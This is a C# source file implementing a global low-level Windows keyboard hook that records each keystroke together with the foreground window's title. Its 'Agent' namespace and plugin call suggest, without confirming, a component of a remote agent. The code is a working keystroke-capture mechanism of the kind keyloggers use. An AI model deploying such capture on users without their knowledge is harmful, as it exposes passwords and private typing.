using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Agent;

public interface IKeyboardHook
{
    event Action<string, string>? KeyPressed;
    Task RunAsync(CancellationToken cancellationToken);
}

internal sealed class NativeKeyboardHook : IKeyboardHook
{
    private Native.HookProc? callback;
    public event Action<string, string>? KeyPressed;

    public Task RunAsync(CancellationToken cancellationToken) => Task.Run(() => Run(cancellationToken), cancellationToken);

    private void Run(CancellationToken cancellationToken)
    {
        callback = Callback;
        string? module = Process.GetCurrentProcess().MainModule?.ModuleName;
        IntPtr moduleHandle = Native.GetModuleHandle(module ?? string.Empty);
        IntPtr hook = Native.SetWindowsHookEx(Native.HookType.WH_KEYBOARD_LL, callback, moduleHandle, 0);
        if (hook == IntPtr.Zero)
        {
            throw new InvalidOperationException("Failed to install keyboard hook.");
        }

        try
        {
            while (!cancellationToken.IsCancellationRequested)
            {
                Native.PeekMessage(IntPtr.Zero, IntPtr.Zero, 0x100, 0x109, 0);
                cancellationToken.WaitHandle.WaitOne(5);
            }
        }
        finally
        {
            Native.UnhookWindowsHookEx(hook);
            callback = null;
        }
    }

    private IntPtr Callback(int code, IntPtr wParam, IntPtr lParam)
    {
        if (code >= 0 && (wParam == 0x100 || wParam == 0x104))
        {
            IntPtr window = Native.GetForegroundWindow();
            if (window != IntPtr.Zero)
            {
                var keystroke = new Keystroke(window, Marshal.ReadInt32(lParam));
                KeyPressed?.Invoke(keystroke.GetWindowTitle(), Plugin.ConvertKeyStroke(keystroke.keyCode));
            }
        }

        return Native.CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
    }
}
